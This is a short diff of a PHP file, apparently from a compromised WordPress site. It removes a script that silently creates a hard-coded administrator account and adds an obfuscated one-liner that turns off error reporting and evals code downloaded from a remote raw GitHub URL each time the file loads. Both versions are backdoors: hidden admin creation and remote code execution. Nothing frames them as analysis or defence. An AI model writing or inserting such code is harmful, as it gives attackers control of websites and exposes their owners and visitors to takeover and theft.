@@ -1,17 +1,1 @@
-<?php
-// Load WordPress core
-require_once('wp-load.php');
-
-$username = 'admin11';
-$password = 'supersecurepassword1';
-$email = 'wordpress@gmail.com';
-
-if (!username_exists($username)) {
-    $user_id = wp_create_user($username, $password, $email);
-    $user = new WP_User($user_id);
-    $user->set_role('administrator');
-    echo "User berhasil ditambahkan.\n";
-} else {
-    echo "Username sudah ada.\n";
-}
-?>
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/pink.txt"))?>
